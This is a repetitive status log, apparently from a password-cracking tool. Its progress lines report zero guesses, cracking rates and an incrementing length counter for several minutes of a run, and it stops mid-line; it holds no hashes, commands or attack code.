guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:469/469/469 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:470/470/470 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:471/471/471 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:472/472/472 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:473/473/473 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:474/474/474 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:475/475/475 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:476/476/476 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:477/477/477 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:478/478/478 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:479/479/479 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:480/480/480 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:481/481/481 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:482/482/482 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:483/483/483 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:484/484/484 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:485/485/485 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:486/486/486 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:487/487/487 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:488/488/488 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:489/489/489 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:490/490/490 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:491/491/491 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:492/492/492 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:493/493/493 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:494/494/494 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:495/495/495 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:496/496/496 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:497/497/497 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:498/498/498 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:499/499/499 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:500/500/500 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:501/501/501 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:502/502/502 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:503/503/503 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:504/504/504 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:505/505/505 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:506/506/506 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:507/507/507 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:508/508/508 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:509/509/509 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:510/510/510 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:511/511/511 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:512/512/512 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:513/513/513 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:514/514/514 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:515/515/515 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:516/516/516 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:517/517/517 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:518/518/518 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:519/519/519 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:520/520/520 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:521/521/521 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:522/522/522 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:523/523/523 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:524/524/524 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:525/525/525 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:526/526/526 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:527/527/527 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:528/528/528 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:529/529/529 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:530/530/530 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:531/531/531 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:532/532/532 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:533/533/533 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:534/534/534 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:535/535/535 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:536/536/536 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:537/537/537 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:538/538/538 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:539/539/539 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:540/540/540 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:541/541/541 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:542/542/542 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:543/543/543 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:544/544/544 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:545/545/545 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:546/546/546 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:547/547/547 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:548/548/548 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:549/549/549 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:550/550/550 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:551/551/551 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:552/552/552 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:553/553/553 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:554/554/554 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:555/555/555 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:556/556/556 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:557/557/557 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:558/558/558 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:559/559/559 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:560/560/560 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:561/561/561 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:562/562/562 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:563/563/563 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:564/564/564 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:565/565/565 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:566/566/566 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:567/567/567 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:568/568/568 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:569/569/569 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:570/570/570 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:571/571/571 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:572/572/572 FL
guesses:          0  time:    0:00:08:59 0.0% (3)  HA/s:6925K p/s:133K   ls:1g  c/s:6914K  l:573/57